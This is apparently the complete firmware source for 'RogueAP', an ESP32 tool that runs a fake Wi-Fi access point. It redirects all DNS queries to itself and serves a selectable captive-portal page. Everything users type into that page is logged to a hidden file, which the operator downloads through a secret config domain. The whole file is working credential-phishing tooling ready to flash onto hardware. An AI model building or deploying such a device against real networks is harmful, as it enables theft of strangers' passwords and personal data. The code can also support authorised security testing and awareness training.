/*
 * RogueAP for ESP32
 * version 0.1 (05/19/2018)
 * 
 * - Act as fake access point 
 * - Respond all DNS queries with own IP
 * - Provide captive portal
 */


#include <WiFiClient.h>
#include <ESP32WebServer.h>
#include <WiFi.h>
#include <DNSServer.h>
#include "FS.h"
#include <SPIFFS.h>
#include <detail/RequestHandlersImpl.h>
#include <ArduinoJson.h>

#define CONFIG_FILE "/config.json"
#define MAX_PORTALS 10

// struct for the global config
struct CONFIG {
  String activePortal;
  String logFileName;
  String ssid;
  String configDomain;
  uint8_t numStoredPortals;
  String availablePortals[MAX_PORTALS];
} config;

// general settings - no need to change
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;

ESP32WebServer server(80);

/*
 * SETUP
 * - enable serial (for DEBUG output)
 * - enable SPIFFS
 * - load config from flash file system (SPIFFS)
 * - enable Wifi and AP mode
 * - enable DNS
 * - enable webserver
 */
void setup() {

  Serial.begin(250000); 

  // start flash file system and load config from JSON file
  SPIFFS.begin();
  loadConfig();
  
  // Enable AP mode
  WiFi.mode(WIFI_AP);
  WiFi.softAP(config.ssid.c_str());
  delay(100);   // bugfix for internal processes to finish before setting IP addr.
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));

  // if DNSServer is started with "*" for domain name, it will reply with
  // provided IP to all DNS request
  dnsServer.start(DNS_PORT, "*", apIP);
    
  /* register callback function for webserver */
  server.on("/", servePortal);              // usual request
  server.on("/logfile.txt", serveLogFile);  // get 'secret'logfile
  server.on("/config", configPage);         // config page

  server.onNotFound(handleUnknown);
  
  /* start web server */
  server.begin();
  Serial.println("\n\nHTTP server started");

  /* write a line into the logfile to indicate the startup */
  File file = SPIFFS.open(config.logFileName, FILE_APPEND);
  if(!file){
    Serial.println("- failed to open file for appending");
    return;
  }
  file.println("--- restart ---");
  
}

/*
 * Main program loop
 * - process DNS requests
 * - process HTTP requests
 */
void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}

/*
 * send the 'secret' logfile
 */
void serveLogFile() {
  // verify that the request was made with the correct config url
  Serial.print("Requested FQDN: #"); Serial.print(server.hostHeader());Serial.println("#");
  if (!server.hostHeader().equals(config.configDomain)) {
    Serial.print("does not match config FQDN! should be: #"); Serial.print(config.configDomain);Serial.println("#");
    servePortal();
    return;
  }
  // return the logfile
  serveFile(config.logFileName.c_str());
}


// serve the captive portal page
void servePortal() {
  // are there any arguments? in case yes, it seems like the user already clicked submit
  if (server.args() > 0) {
    // go through all arguments
    String logEntry;
    for (uint8_t i=0; i<server.args(); i++) {
      logEntry += server.argName(i) + ": " + server.arg(i) + "   ";
    }
    logEntry += "\n";
    Serial.println(logEntry);

    // write all arguments to the logfile
    File file = SPIFFS.open(config.logFileName, FILE_APPEND);
    if(!file){
        Serial.println("- failed to open file for appending");
        return;
    }
    file.print(logEntry);
  }
  // serve the portal page
  serveFile(config.activePortal.c_str());
}


// Trying to load scripts from SPIFFS
void handleUnknown() {
  String filename = "/scripts";
  filename += server.uri();
  serveFile(filename.c_str());
} // End handleUnknown

void serveFile(const char* fileName) {
  File pageFile = SPIFFS.open(fileName, "r");
  if (pageFile && !pageFile.isDirectory()) {
    String contentTyp = StaticRequestHandler::getContentType(fileName);
    server.sendHeader("Cache-Control","public, max-age=31536000");
    size_t sent = server.streamFile(pageFile, contentTyp);
    pageFile.close();
  }
  else
//    notFound();
  servePortal();
}

// load the config stored in a json file
bool loadConfig() {
  File configFile = SPIFFS.open(CONFIG_FILE, "r");
  if (!configFile) {
    Serial.println("Failed to open config file");
    return false;
  }

  size_t size = configFile.size();
  if (size > 1024) {
    Serial.println("Config file size is too large");
    return false;
  }

  // Allocate a buffer to store contents of the file.
  std::unique_ptr<char[]> buf(new char[size]);

  configFile.readBytes(buf.get(), size);

  StaticJsonBuffer<200> jsonBuffer;
  JsonObject& json = jsonBuffer.parseObject(buf.get());

  if (!json.success()) {
    Serial.println("Failed to parse config file");
    return false;
  }

  // copy to active config
  config.activePortal = String((const char*) json["activePortal"]);
  config.logFileName = String((const char*) json["logFileName"]);
  config.ssid = String((const char*) json["ssid"]);
  config.configDomain = String((const char*) json["configDomain"]);
  return true;
}

// safe the current config to a json file in SPIFFS
bool saveConfig() {
  StaticJsonBuffer<200> jsonBuffer;
  JsonObject& json = jsonBuffer.createObject();
  json["activePortal"] = config.activePortal;
  json["logFileName"] = config.logFileName;
  json["ssid"] = config.ssid;
  json["configDomain"] = config.configDomain;
  
  File configFile = SPIFFS.open(CONFIG_FILE, "w");
  if (!configFile) {
    Serial.println("Failed to open config file for writing");
    return false;
  }

  json.printTo(configFile);
  return true;
}

/*
 * Check the flash (SPIFFS) for available portals (single page HTML files)
 */
void checkAvailablePortals(){
    File root = SPIFFS.open("/portals");
    if(!root){
        Serial.println("Failed to open directory");
        return;
    }
    if(!root.isDirectory()){
        Serial.println("Not a directory");
        return;
    }
    config.numStoredPortals = 0;
    File file = root.openNextFile();
    while(file){
        if(!file.isDirectory()){
            config.availablePortals[config.numStoredPortals] = file.name();
            config.numStoredPortals++;
         }
        file = root.openNextFile();
    }
}

/*
 * 'secret' config page
 */
void configPage() {
  // verify that the request was made with the correct config url
  Serial.print("Requested FQDN: #"); Serial.print(server.hostHeader());Serial.println("#");
  if (!server.hostHeader().equals(config.configDomain)) {
    Serial.print("does not match config FQDN! should be: #"); Serial.print(config.configDomain);Serial.println("#");
    servePortal();
    return;
  }

  // Check whether there are arguents or not. In case yes, store the configuration. If not, show the config page
  if (server.args() > 0) {
    // go through all arguments
    if (server.hasArg("portal")) { config.activePortal = server.arg("portal"); config.activePortal.trim(); }
    if (server.hasArg("ssid")) { config.ssid = server.arg("ssid"); config.ssid.trim(); }
    if (server.hasArg("logFile")) { config.logFileName = server.arg("logFile"); config.logFileName.trim(); }
    if (server.hasArg("configDomain")) { config.configDomain = server.arg("configDomain"); config.configDomain.trim(); }

    /* DEBUG */
    Serial.print("PORTAL: "); Serial.println(config.activePortal);
    Serial.print("SSID: "); Serial.println(config.ssid);
    Serial.print("LOG: "); Serial.println(config.logFileName);
    Serial.print("ConfigDomain: "); Serial.println(config.configDomain);

    // save config to flash
    saveConfig();

    // send http ok message
    String html;
    html = "<html><head></head><body><h2>Config saved</h2>";
    html += config.activePortal;
    html += "<br>";
    html += config.ssid;
    html += "<br>";
    html += config.logFileName;
    html += "<br>";
    html += config.configDomain;
    html += "</body></html>";
    server.send(200, "text/html", html);
    return;
    
  } else {        // show config page
    // see what portals are available
    checkAvailablePortals();

    // construct config page
    String html;
    html += "<html>";
    html += "<head>";
    html += "  <title>Fake AP config page</title>";
    html += "</head>";
    html += "<body>";
    html += "  <h2>Fake AP config page</h2>";
    html += "  <div class=\"form\" action=\"/config\">";
    html += "  <form class=\"register-form\">";
    html += "    <table sytle=\"width: 100%\">";
    html += "      <tr>";
    html += "        <th>Paramater</th>";
    html += "        <th>Value</th>";
    html += "      </tr>";
    html += "      <tr>";
    html += "        <td>SSID</td>";
    html += "        <td><input type=\"ssid\" placeholder=\"SSID\" name=\"ssid\" value=\"";
    html += config.ssid;
    html += " \"/></td>";
    html += "      </tr>";
    html += "      <tr>";
    html += "        <td>LogFile</td>";
    html += "        <td><input type=\"logFile\" placeholder=\"LogFile\" name=\"logFile\" value=\"";
    html += config.logFileName;
    html += " \"/></td>";
    html += "      </tr>";
    html += "          <tr>";
    html += "          <td>Capture portal</td>";
    html += "          <td>";
    html += "            <select name=\"portal\">";
    for (uint8_t loop = 0; loop < config.numStoredPortals; loop++) {
      html += "                <option value=\"";
      html += config.availablePortals[loop];
      if (config.activePortal == config.availablePortals[loop].c_str()) {
        html += "\" selected>";
      } else {
        html += "\">";
      }
      html += config.availablePortals[loop];
      html += "</option>";
    }
    html += "            </select>";
    html += "          </td>";
    html += "        </tr>";
    html += "      <tr>";
    html += "        <td>Config domain</td>";
    html += "        <td><input type=\"configDomain\" placeholder=\"configDomain\" name=\"configDomain\" value=\"";
    html += config.configDomain;
    html += " \"/></td>";
    html += "      </tr>";
    html += "    </table>";
    html += "  <input type=\"submit\" value=\"Save\">";
    html += "  </form>";
    html += "  </div>";
    html += "</body>";
    html += "</html>";
  
    server.send(200, "text/html", html);
  }
}



